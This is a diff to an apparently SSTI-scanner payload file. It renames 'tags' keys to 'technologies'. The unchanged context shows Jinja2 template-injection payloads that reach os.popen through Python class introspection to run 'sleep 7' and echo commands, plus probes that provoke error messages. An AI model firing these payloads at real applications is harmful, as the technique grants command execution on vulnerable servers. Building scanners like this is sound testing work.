@@ -24,7 +24,8 @@
             ],
             "verify": ["[RANDOM_5]0"],
             "type": "REGEX",
-            "tags": ["generic", "payload_template"],
+            "technologies": ["generic"],
+            "tags": ["payload_template"],
             "vars": {
                 "encoding": ["none", "quote", "double_encode", "quote_plus"]
             }
@@ -41,7 +42,7 @@
                 "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"sleep 7\").read()}}{%endif%}{% endfor %}",
                 "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('sleep 7').read()}}{%endif%}{% endfor %}"
             ],
-            "tags": ["jinja2"],
+            "technologies": ["jinja2"],
             "type": "TIME",
             "verify": [7]
         },
@@ -50,7 +51,7 @@
                 "{{[[RANDOM_1],[RANDOM_2],[RANDOM_3]]|join}}",
                 "{{[RANDOM_1]~[RANDOM_2]~[RANDOM_3]}}"
             ],
-            "tags":["jinja2"],
+            "technologies":["jinja2"],
             "verify":["[RANDOM_1][RANDOM_2][RANDOM_3]"],
             "type":"REGEX"
         },
@@ -58,7 +59,7 @@
             "payload":[
                 "{{r[RANDOM_5]()]}}"
             ],
-            "tags":["jinja2"],
+            "technologies":["jinja2"],
             "type":"REGEX",
             "verify":["UndefinedError: 'r[RANDOM_5]' is undefined"]
         },
@@ -66,7 +67,7 @@
             "payload":[
                 "{{r[RANDOM_5]()]}}"
             ],
-            "tags":["jinja2"],
+            "technologies":["jinja2"],
             "type": "REGEX",
             "verify":["UndefinedError: 'r[RANDOM_5]' is undefined"]
         },
@@ -76,7 +77,7 @@
                 "{{{}}",
                 "{% include OUTPUT %}"
             ],
-            "tags":["jinja2"],
+            "technologies":["jinja2"],
             "type": "REGEX",
             "verify":["TypeError: 'int' object is not callable", "TemplateSyntaxError: unexpected", "TemplateNotFound: "]
         },
@@ -94,7 +95,7 @@
                 "{% print(joiner.__init__.__globals__['os'].popen('echo $(([RANDOM_5]*5*2))').read()) %}",
                 "{% print(namespace.__init__.__globals__['os'].popen('echo $(([RANDOM_5]*5*2))').read()) %}"
             ],
-            "tags":["jinja2"],
+            "technologies":["jinja2"],
             "verify":["(<class '.+)+(<class '.+)+", "[RANDOM_5]0"],
             "type": "REGEX"
         },
@@ -102,7 +103,7 @@
             "payload":[
                 "{%print([RANDOM_6],[RANDOM_6],[RANDOM_5])%}"
             ],
-            "tags":["jinja2"],
+            "technologies":["jinja2"],
             "verify":["[RANDOM_6][RANDOM_6]", "([RANDOM_6], [RANDOM_6], [RANDOM_5])"],
             "type": "REGEX"
         }
